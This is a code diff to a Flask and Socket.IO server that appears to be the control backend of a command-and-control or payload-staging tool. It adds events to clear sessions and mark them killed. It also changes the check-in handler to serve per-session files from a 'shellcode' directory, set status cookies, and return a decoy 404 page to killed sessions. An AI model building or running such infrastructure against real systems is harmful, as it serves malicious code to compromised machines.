@@ -43,6 +43,22 @@ def connect():
         if thread is None:
             thread = socketio.start_background_task(target=background_thread)
 
+@socketio.event
+def cleardb():
+    with app.app_context():
+        Session.query.delete()
+        print('[+] Cleared Database')
+        db.session.commit()
+
+@socketio.event
+def kill(data):
+    print('[+] Killing session')
+    with app.app_context():
+        session = Session.query.filter_by(id=data['id']).first()
+        if session:
+            session.kill = True
+            db.session.commit()
+            
 
 @socketio.event
 def load(data):
@@ -76,10 +92,16 @@ def default(t):
     if session is not None:
         print("[+] Session found")
         # check if the session is loaded
+        if session.kill:
+            print("[+] Session killed")
+            response = make_response(render_template('404.html'))
+            response.set_cookie('session', "kill")
+            return response
         if session.loaded:
             print("[+] Session is loaded")
             response = make_response(send_from_directory(
                 'shellcode', '{0}.bin'.format(session.id)))
+            response.set_cookie('session', "load")
             # update loaded to false
             session.loaded = False
             with app.app_context():
